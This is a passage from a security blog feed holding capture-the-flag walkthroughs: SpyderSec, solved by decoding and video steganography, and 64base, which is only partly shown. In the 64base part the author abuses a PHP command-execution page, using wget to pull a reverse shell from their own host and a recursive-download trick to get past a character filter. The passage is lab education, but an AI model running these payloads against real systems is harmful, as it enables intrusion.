<li><p><strong>Non-verbal communicaton</strong> &ndash; this is where micro expressions and body language are discussed. It essentially gives you a roadmap for reading people&rsquo;s true feelings and intentions, detecting lies, and masking your own thoughts. Very practical to be aware of these thing in all kinds of settings and social interactions.</p></li>
</ul>


<p>All in all, I&rsquo;ve really enjoyed this course and highly recommend it. What would have made it even better would have been a practical component in order to complete it, a lab or task around phishing / OSINT, especially since at the end you get a certification. That being said, this is a very solid course and you don&rsquo;t need to be social engineered to get it :D</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _____________________________________
</span><span class='line'>/ Change your thoughts and you change \
</span><span class='line'>\ your world.                         /
</span><span class='line'> -------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Take the SpyderSec Challenge]]></title>
    <link href="http://chousensha.github.io/blog/2018/11/10/take-the-spydersec-challenge/"/>
    <updated>2018-11-10T14:43:09+02:00</updated>
    <id>http://chousensha.github.io/blog/2018/11/10/take-the-spydersec-challenge</id>
    <content type="html"><![CDATA[<p>The challenge:</p>

<blockquote><p>You are looking for two flags. Using discovered pointers in various elements of the running web
application you can deduce the first flag (a downloadable file) which is required to find the second
flag (a text file). Look, read and maybe even listen. You will need to use basic web application
recon skills as well as some forensics to find both flags.</p></blockquote>

<!-- more -->




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT   STATE  SERVICE VERSION
</span><span class='line'>22/tcp closed ssh
</span><span class='line'>80/tcp open   http    Apache httpd
</span><span class='line'>|_http-server-header: Apache
</span><span class='line'>|_http-title: SpyderSec | Challenge</span></code></pre></td></tr></table></div></figure>


<p>There is just one page for the web server:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/spydersec/spydersec.png" title="spydersec" alt="spydersec"></p>

<p>There is some peculiar Javascript in the source:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;script&gt;
</span><span class='line'>eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('7:0:1:2:8:6:3:5:4:0:a:1:2:d:c:b:f:3:9:e',16,16,'6c|65|72|27|75|6d|28|61|74|29|64|62|66|2e|3b|69'.split('|'),0,{}))
</span><span class='line'>&lt;/script&gt;</span></code></pre></td></tr></table></div></figure>


<p>I used an <a href="https://beautifier.io/">online JS beautifier</a> to deobfuscate this to a hex string, which I then decoded to <code>alert(&lsquo;mulder.fbi&rsquo;);</code>. This name is familiar to me from the X-Files. Anyway, not sure about its relevance for now. Moving on with the information gathering, since nothing came out of Nikto or Gobuster, I browsed the page in Burp, and noticed a strange cookie being set:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Cookie: URI=%2Fv%2F81JHPbvyEQ8729161jd6aKQ0N4%2F</span></code></pre></td></tr></table></div></figure>


<p>URL decoding this gave me the value <code>/v/81JHPbvyEQ8729161jd6aKQ0N4/</code> Tried browsing to this and got a 403 Forbidden error. There is some piece of the puzzle missing..so I took the next step and downloaded all the images and ran them through exiftool..and finally got some luck with the Challenge.png image, which had a hex comment:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Comment                         : 35:31:3a:35:33:3a:34:36:3a:35:37:3a:36:34:3a:35:38:3a:33:35:3a:37:31:3a:36:34:3a:34:35:3a:36:37:3a:36:61:3a:34:65:3a:37:61:3a:34:39:3a:33:35:3a:36:33:3a:33:30:3a:37:38:3a:34:32:3a:34:66:3a:33:32:3a:36:37:3a:33:30:3a:34:61:3a:35:31:3a:33:64:3a:33:64</span></code></pre></td></tr></table></div></figure>


<p>Had to hex-decode this 2 times to get a base64 string: <em>QSFWdX5qdEgjNzI5c0xBO2g0JQ==</em>, which I decoded to <code>A!Vu~jtH#729sLA;h4%</code>. This looks like a password, but where to use it?</p>

<p>With the hints from the description, knowing that a file will need to be downloaded, I treated mulder.fbi as a file and tried appending it to the URL path that gave me a forbidden error: <a href="http://192.168.145.141/v/81JHPbvyEQ8729161jd6aKQ0N4/mulder.fbi">http://192.168.145.141/v/81JHPbvyEQ8729161jd6aKQ0N4/mulder.fbi</a></p>

<p>That actually worked and I downloaded the file, which is apparently an MP4:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>file mulder.fbi 
</span><span class='line'>mulder.fbi: ISO Media, MP4 v2 [ISO 14496-14]</span></code></pre></td></tr></table></div></figure>


<p>This is a song by The Platters. Since I couldn&rsquo;t use steghide on a video, I googled for MP4 steganography and found this Lifehacker article about <a href="https://lifehacker.com/5771142/embed-a-truecrypt-volume-in-a-playable-video-file">embedding a TrueCrypt volume in a video</a>. I installed Veracrypt and used it to mount the file as a volume, in TrueCrypt mode. At the password prompt, I used the string that I&rsquo;ve decoded earlier, and it served me the volume, with a file called Flag.txt inside!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat Flag.txt 
</span><span class='line'>Congratulations! 
</span><span class='line'>
</span><span class='line'>You are a winner. 
</span><span class='line'>
</span><span class='line'>Please leave some feedback on your thoughts regarding this challenge� Was it fun? Was it hard enough or too easy? What did you like or dislike, what could be done better?
</span><span class='line'>
</span><span class='line'>https://www.spydersec.com/feedback</span></code></pre></td></tr></table></div></figure>


<p>The main takeaways from this challenge for me were the steganography possibilities for video files. Until next time!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ________________________________________
</span><span class='line'>/ Q: How many hardware engineers does it \
</span><span class='line'>| take to change a light bulb? A: None.  |
</span><span class='line'>| We'll fix it in software.              |
</span><span class='line'>|                                        |
</span><span class='line'>| Q: How many system programmers does it |
</span><span class='line'>| take to change a light bulb? A: None.  |
</span><span class='line'>| The application can work around it.    |
</span><span class='line'>|                                        |
</span><span class='line'>| Q: How many software engineers does it |
</span><span class='line'>| take to change a light bulb? A: None.  |
</span><span class='line'>| We'll document it in the manual.       |
</span><span class='line'>|                                        |
</span><span class='line'>| Q: How many tech writers does it take  |
</span><span class='line'>| to change a light bulb? A: None. The   |
</span><span class='line'>\ user can figure it out.                /
</span><span class='line'> ----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>


<p></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[All your 64Base are belong to us]]></title>
    <link href="http://chousensha.github.io/blog/2018/10/26/all-your-64base-are-belong-to-us/"/>
    <updated>2018-10-26T22:14:14+03:00</updated>
    <id>http://chousensha.github.io/blog/2018/10/26/all-your-64base-are-belong-to-us</id>
    <content type="html"><![CDATA[<p>This machine is based on Star Wars. The goal is &ldquo;to Beat the Empire and steal the plans for the Death Star before its too late.&rdquo;. For this to happen, 6 flags encoded in base64 need to be collected.</p>

<p><a href="https://www.youtube.com/watch?v=v8MqvUeDqL4">I AM THE EMPIRE!</a></p>

<!-- more -->




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE VERSION
</span><span class='line'>22/tcp    open  ssh?
</span><span class='line'>| fingerprint-strings: 
</span><span class='line'>|   GenericLines, NULL: 
</span><span class='line'>|     The programs included with the Fedora GNU/Linux system are free software;
</span><span class='line'>|     exact distribution terms for each program are described in the
</span><span class='line'>|     individual files in /usr/share/doc/*/copyright.
</span><span class='line'>|     Fedora GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>|     permitted by applicable law.
</span><span class='line'>|_    Last login: Mon Oct 24 02:04:10 4025 from 010.101.010.001
</span><span class='line'>80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
</span><span class='line'>| http-robots.txt: 429 disallowed entries (15 shown)
</span><span class='line'>| /administrator/ /admin/ /login/ /88888/ /88888888/ 
</span><span class='line'>| /88888888888/ /88888888888P/ /c3P08P/ /C3p0/ /A280/ /above/ /AC1/ 
</span><span class='line'>|_/across/ /activation/ /Adjustments/
</span><span class='line'>|_http-server-header: Apache/2.4.10 (Debian)
</span><span class='line'>|_http-title: 64base
</span><span class='line'>4899/tcp  open  radmin?
</span><span class='line'>| fingerprint-strings: 
</span><span class='line'>|   NULL: 
</span><span class='line'>|     sshhh! ssh! droids!
</span><span class='line'>|     So..
</span><span class='line'>|     found a way in then...
</span><span class='line'>|     but, can you pop root?
</span><span class='line'>|     /~\n |oo ) Did you hear that?
</span><span class='line'>|     _=/_
</span><span class='line'>|     ()\x20 //|/.\|\
</span><span class='line'>|     _|_____|_ \ _/ ||
</span><span class='line'>|     \|\x20/| ||
</span><span class='line'>|     ||__*__|| | | |
</span><span class='line'>|     ___/ ~| []|[]
</span><span class='line'>|     /=\x20/=\x20/=\x20 | | |
</span><span class='line'>|_    ________________[_]_[_]_[_]________/_]_[__________________________
</span><span class='line'>62964/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
</span><span class='line'>| ssh-hostkey: 
</span><span class='line'>|   1024 59:a5:02:ba:72:8a:2e:c1:9c:ff:cc:b2:f8:15:66:b3 (DSA)
</span><span class='line'>|   2048 2a:57:2c:75:8c:34:9f:28:84:15:07:2a:be:d0:41:98 (RSA)
</span><span class='line'>|   256 97:94:13:38:92:70:6c:3a:c0:4f:f3:f3:e7:ce:40:91 (ECDSA)
</span><span class='line'>|_  256 e0:45:24:da:a1:2d:8a:21:c8:cf:98:4b:7f:42:e7:d4 (ED25519)</span></code></pre></td></tr></table></div></figure>


<p>The first red herring is SSH on port 22. If you try connecting to it, it looks like it gives you a root shell, and then it closes the connection. There is no SSH there:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vn 192.168.145.138 22
</span><span class='line'>(UNKNOWN) [192.168.145.138] 22 (ssh) open
</span><span class='line'>The programs included with the Fedora GNU/Linux system are free software;
</span><span class='line'>the exact distribution terms for each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Fedora GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>Last login: Mon Oct 24 02:04:10 4025 from 010.101.010.001
</span><span class='line'>
</span><span class='line'>#
</span><span class='line'>id</span></code></pre></td></tr></table></div></figure>


<p>Then there is port 4899, which shows some ASCII art, but nothing seems to happen otherwise:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>You found a way in then...
</span><span class='line'>
</span><span class='line'>but, can you pop root?
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>                                           /~\
</span><span class='line'>                                          |oo )    Did you hear that?
</span><span class='line'>                                          _\=/_
</span><span class='line'>                          ___            /  _  \
</span><span class='line'>                         / ()\          //|/.\|\\
</span><span class='line'>                       _|_____|_        \\ \_/  ||
</span><span class='line'>                      | | === | |        \|\ /| ||
</span><span class='line'>                      |_|  O  |_|        # _ _/ #
</span><span class='line'>                       ||  O  ||          | | |
</span><span class='line'>                       ||__*__||          | | |
</span><span class='line'>                      |~ \___/ ~|         []|[]
</span><span class='line'>                      /=\ /=\ /=\         | | |
</span><span class='line'>      ________________[_]_[_]_[_]________/_]_[_\_________________________</span></code></pre></td></tr></table></div></figure>


<h2>Flag #1 &ndash; Decode and decode some more</h2>

<p>The web server takes us to Lord Vader&rsquo;s blog:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/64base/blog.png" title="blog" alt="vader blog"></p>

<p>You probably noticed that weird string, <em>dmlldyBzb3VyY2UgO0QK</em>. If you look in the HTML source, you will find a comment following it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!--5a6d78685a7a4637546d705361566c59546d785062464a7654587056656c464953587055616b4a56576b644752574e7151586853534842575555684b6246524551586454656b5a77596d316a4d454e6e5054313943673d3d0a--&gt;</span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s hex encoded, and decoding it gives a&hellip;I&rsquo;m sure you expect it by now&hellip;base64 string:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ZmxhZzF7TmpSaVlYTmxPbFJvTXpVelFISXpUakJVWkdGRWNqQXhSSHBWUUhKbFREQXdTekZwYm1jMENnPT19Cg==</span></code></pre></td></tr></table></div></figure>


<p>Decoding this gives the 1st flag: <code>flag1{NjRiYXNlOlRoMzUzQHIzTjBUZGFEcjAxRHpVQHJlTDAwSzFpbmc0Cg==}</code>, and further decoding the flag leaves us with what look like credentials for something: <code>64base:Th353@r3N0TdaDr01DzU@reL00K1ing4</code></p>

<h2>Flag #2 &ndash; Imperial class bounty hunter</h2>

<p>If you browse the pages you can read some Star Wars centric posts. I didn&rsquo;t go through them thoroughly, but I did notice a relevant hint in a picture for something that might come up later:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/64base/hint.jpg" title="hint" alt="shell hint"></p>

<p>So..when we&rsquo;ll reach the point of getting a shell, we&rsquo;ll have to use <em>system</em> instead of <em>exec</em>. Cool..now it&rsquo;s time to look inside that massive robots.txt. There are too many entries to show and the few I&rsquo;ve tried were blank. Under <em>/admin</em> there&rsquo;s basic authentication, but the credentials from the first flag didn&rsquo;t work. Some attention to detail is required for this one. In the above picture, there is another important hint that I&rsquo;ve overlooked: <em>Only respond if you are a real Imperial-Class BountyHunter</em>. Within the plethora of robots.txt entries there is this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Disallow: /Imperial-class/</span></code></pre></td></tr></table></div></figure>


<p>Useless like the others, but the message said <em>Imperial-Class</em>..could it be that one capital letter would make the difference? I tried <a href="http://192.168.145.138/Imperial-Class/">http://192.168.145.138/Imperial-Class/</a> and another basic authentication box popped up, and this time the credentials worked!</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/64base/error.jpg" title="error" alt="error"></p>

<p>It looks like a dead end, but the source is with us:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!-- don't forget the BountyHunter login --&gt;</span></code></pre></td></tr></table></div></figure>


<p>Adding this part to the URL (<em>Imperial-Class/BountyHunter</em>) takes us to a login page:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/64base/login.jpg" title="login" alt="login"></p>

<p>The force..source to the rescue again! If you view the source, you will notice another 3 hex strings:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>5a6d78685a7a4a37595568534d474e4954545a4d65546b7a5a444e6a645756
</span><span class='line'>584f54466b53465a70576c4d31616d49794d485a6b4d6b597757544a6e4c32
</span><span class='line'>584f54466b53465a70576c4d31616d49794d485a6b4d6b597757544a6e4c32</span></code></pre></td></tr></table></div></figure>


<p>Decoding them as a block gives us another base64 string:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ZmxhZzJ7YUhSMGNITTZMeTkzZDNjdWVXOTFkSFZpWlM1amIyMHZkMkYwWTJnL2RqMTJTbmQ1ZEVaWFFUaDFRUW89fQo=</span></code></pre></td></tr></table></div></figure>


<p>And decoding this gives the second flag: <code>flag2{aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj12Snd5dEZXQTh1QQo=}</code>. But it&rsquo;s the inside that matters, and it&rsquo;s actually a <a href="https://www.youtube.com/watch?v=vJwytFWA8uA">link to Youtube</a></p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/64base/burp.png" title="burp" alt="burp"></p>

<p>So we&rsquo;ll have to use Burp for the next part.</p>

<h2>Flag #3 &ndash; Burp&#8217;ing for the empire</h2>

<p>I&rsquo;ve put some dummy values in the login form and intercepted the requests with Burp..it&rsquo;s important to also capture the server response, because the flag is in the 302 Moved Temporarily response from the server: <code>flag3{NTNjcjN0NWgzNzcvSW1wZXJpYWwtQ2xhc3MvQm91bnR5SHVudGVyL2xvZ2luLnBocD9mPWV4ZWMmYz1pZAo=}</code>. And decoding it shows the way to the secret shell that was hinted at previously: <code>53cr3t5h377/Imperial-Class/BountyHunter/login.php?f=exec&amp;c=id</code></p>

<h2>Flag #4 &ndash; System, not exec</h2>

<p>Going to <a href="http://192.168.145.138/Imperial-Class/BountyHunter/login.php?f=exec&amp;c=id">http://192.168.145.138/Imperial-Class/BountyHunter/login.php?f=exec&amp;c=id</a> takes us to a page that only has the text &ldquo;[64base Command Shell]&rdquo; displayed on it. Trying different commands for the <em>c</em> parameter doesn&rsquo;t change anything, but we have the tip from before. So I switched to <strong>?f=system&amp;c=id</strong> and got the flag and the command output:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>flag4{NjRiYXNlOjY0YmFzZTVoMzc3Cg==}
</span><span class='line'>
</span><span class='line'>Debian GNU/Linux 8 \n \l
</span><span class='line'>
</span><span class='line'>Sat Oct 27 16:05:00 BST 2018
</span><span class='line'>Linux 64base 3.16.0-4-586 #1 Debian 3.16.36-1+deb8u2 (2016-10-19) i686 GNU/Linux
</span><span class='line'>          inet addr:192.168.145.138  Bcast:192.168.145.255  Mask:255.255.255.0
</span><span class='line'>          inet6 addr: fe80::20c:29ff:fe0a:a6d1/64 Scope:Link
</span><span class='line'>
</span><span class='line'>uid=1001(64base) gid=1001(64base) groups=1001(64base)</span></code></pre></td></tr></table></div></figure>


<p>Decoding the flag gives another set of possible credentials: <code>64base:64base5h377</code>. Tried them on the SSH with no success.</p>

<h2>Flag #5 &ndash; When nothing else works, recurse!</h2>

<p>Even though it looks like we have a shell, in reality, many commands don&rsquo;t work. At this point, I looked at a hint from other solutions to understand what is going on. It seems there is some filtering in place, and you can see what is being filtered by using PHP&rsquo;s <strong>var_dump</strong> function, which displays structured information (type and value) about variables. I tried downloading a reverse shell from my system with <code>?f=system&amp;c=wget <a href="http://192.168.145.133:8001/shell.php">http://192.168.145.133:8001/shell.php</a></code>, but of course it didn&rsquo;t work. However, when I tried looking at how the command is constructed with <code>?f=var_dump&amp;c=wget <a href="http://192.168.145.133:8001/shell.php">http://192.168.145.133:8001/shell.php</a></code>, I saw what was filtered out:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>string(190) "echo '
</span><span class='line'>flag4{NjRiYXNlOjY0YmFzZTVoMzc3Cg==}
</span><span class='line'>';cat.real /etc/issue;date;uname -a;/sbin/ifconfig eth0|/usr/share/grep.real inet;echo
</span><span class='line'> sudo -u 64base wget http192.168.145.1338001shell.php"</span></code></pre></td></tr></table></div></figure>


<p>The slash and colon characters are filtered out. I played with it and saw that other special characters are also filtered out, so I couldn&rsquo;t use command chaining to get rid of it. I could not point wget to my server that with the shell. But wget has the option of recursive downloading, with the <em>-r</em> switch. If I could serve the shell in the root of my web server, it should be recursively downloaded, since there would be no blacklisted characters in the command. So I used Python&rsquo;s SimpleHTTPServer to serve the shell on port 80 and tested the recursive download from my machine, and it created a directory corresponding with the one downloaded, with the shell inside:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wget -r 192.168.145.133
</span><span class='line'>--2018-10-27 10:03:58--  http://192.168.145.133/
</span><span class='line'>Connecting to 192.168.145.133:80... connected.
</span><span class='line'>HTTP request sent, awaiting response... 200 OK
</span><span class='line'>Length: 216 [text/html]
</span><span class='line'>Saving to: ‘192.168.145.133/index.html’
</span><span class='line'>
</span><span class='line'>192.168.145.133/index.html            100%[======================================================================&gt;]     216  --.-KB/s    in 0s      
</span><span class='line'>
</span><span class='line'>2018-10-27 10:03:58 (11.8 MB/s) - ‘192.168.145.133/index.html’ saved [216/216]
</span><span class='line'>
</span><span class='line'>Loading robots.txt; please ignore errors.
</span><span class='line'>--2018-10-27 10:03:58--  http://192.168.145.133/robots.txt
</span><span class='line'>Connecting to 192.168.145.133:80... connected.
</span><span class='line'>HTTP request sent, awaiting response... 404 File not found
</span><span class='line'>2018-10-27 10:03:58 ERROR 404: File not found.
</span><span class='line'>
</span><span class='line'>--2018-10-27 10:03:58--  http://192.168.145.133/shell.php
</span><span class='line'>Connecting to 192.168.145.133:80... connected.
</span><span class='line'>HTTP request sent, awaiting response... 200 OK
</span><span class='line'>Length: 5497 (5.4K) [application/octet-stream]
</span><span class='line'>Saving to: ‘192.168.145.133/shell.php’
</span><span class='line'>
</span><span class='line'>192.168.145.133/shell.php             100%[======================================================================&gt;]   5.37K  --.-KB/s    in 0s      
</span><span class='line'>
</span><span class='line'>2018-10-27 10:03:58 (638 MB/s) - ‘192.168.145.133/shell.php’ saved [5497/5497]
</span><span class='line'>
</span><span class='line'>FINISHED --2018-10-27 10:03:58--
</span><span class='line'>Total wall clock time: 0.01s
</span><span class='line'>Downloaded: 2 files, 5.6K in 0s (212 MB/s)</span></code></pre></td></tr></table></div></figure>


<p>I made the change and dumped the variable as it looks now:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sudo -u 64base wget -r 192.168.145.138</span></code></pre></td></tr></table></div></figure>


<p>Things are looking good. But when I ran it, still nothing happened, and there was no GET request downloading the shell on my Python server. After more time spent dumping variations of the command, the one that finally worked was <code>?f=system&amp;c=ls | wget -r 192.168.145.133</code></p>

<p>Now my server received a request, and when I listed the current directory:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>total 48K
</span><span class='line'>drwxr-xr-x 6 www-data www-data 4.0K Oct 27 18:12 .
</span><span class='line'>drwxr-xr-x 3 www-data www-data 4.0K Dec  6  2016 ..
</span><span class='line'>drwxr-xr-x 2 www-data www-data 4.0K Oct 27 18:12 192.168.145.133
</span><span class='line'>-rwxr-x--- 1 www-data www-data 2.1K Dec  5  2016 cat
</span><span class='line'>drwxr-xr-x 2 www-data www-data 4.0K Dec  5  2016 css
</span><span class='line'>-rwxr-x--- 1 www-data www-data  757 Dec  6  2016 index.html
</span><span class='line'>-rwxr-x--- 1 www-data www-data  705 Dec  5  2016 index.jade
</span><span class='line'>-rwxr-x--- 1 www-data www-data  959 Dec  6  2016 index.php
</span><span class='line'>drwxr-xr-x 2 www-data www-data 4.0K Dec  5  2016 js
</span><span class='line'>-rwxr-x--- 1 www-data www-data 1.1K Dec  5  2016 license.txt
</span><span class='line'>-rwxr-x--- 1 www-data www-data  835 Dec  6  2016 login.php
</span><span class='line'>drwxr-xr-x 2 www-data www-data 4.0K Dec  5  2016 scss</span></code></pre></td></tr></table></div></figure>


<p>Navigating to <a href="http://192.168.145.138/Imperial-Class/BountyHunter/192.168.145.133/shell.php">http://192.168.145.138/Imperial-Class/BountyHunter/192.168.145.133/shell.php</a> served me the shell on my listener:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
